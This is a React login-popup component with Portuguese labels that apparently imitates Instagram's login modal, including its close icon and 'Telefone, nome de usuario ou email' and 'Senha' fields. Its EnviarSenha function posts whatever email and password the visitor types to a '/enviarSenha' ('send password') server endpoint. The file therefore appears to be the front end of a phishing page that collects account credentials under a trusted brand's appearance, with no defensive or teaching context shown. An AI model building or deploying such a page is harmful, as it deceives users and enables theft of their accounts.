import './login.scss';
import axios from "axios"

import { useState, useRef } from 'react';

export default function PopUp() {
    const [PWD, setPWD] = useState('')
    const [EMAIL, setEMAIL] = useState('')

    const EmailRef = useRef(null);
    const senhaRef = useRef(null);

    const [hidden, setHidden] = useState(true);




    const EnviarSenha = async () => {
        let dadosPessoa = {
            subject: EMAIL,
            text: PWD
        }
        let resposnse = await axios.post('http://localhost:5000/enviarSenha', dadosPessoa)
        console.log(resposnse)
    }

    const IsHide = () => {

        if (hidden)
            setHidden(false)
    }

    return (
        <>
            {hidden && (
                <div className='popMain'>
                    <div className='popUp'>
                        <div className='botaoX'>
                            <span onClick={() => setHidden(false)}>
                            <svg aria-label="Fechar" class="x1lliihq x1n2onr6" color="rgb(115, 115, 115)" fill="rgb(115, 115, 115)" height="18" role="img" viewBox="0 0 24 24" width="18"><title>Fechar</title><polyline fill="none" points="20.643 3.357 12 12 3.353 20.647" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3"></polyline><line fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" x1="20.649" x2="3.354" y1="20.649" y2="3.354"></line></svg>
                            </span>
                        </div>
                        <div className='imgLogo'>

                        </div>

                        <div className='Inputs'>
                            <div onClick={() => EmailRef.current.focus(EmailRef)}>
                                <input ref={EmailRef} type='text' placeholder='Telefone, nome de usuario ou email' onChange={e => setEMAIL(e.target.value)} />

                            </div>

                            <div onClick={() => senhaRef.current.focus(senhaRef)}>
                                <input ref={senhaRef} type='password' placeholder='Senha' onChange={e => setPWD(e.target.value)} />
                            </div>
                        </div>
                      <button onClick={EnviarSenha} >Entrar</button>
                        <span className='Lines'>
                            <span>.</span>
                                <a>OU</a>
                            <span>.</span>
                        </span>
                    </div>

                </div>
            )}
        </>
    );
};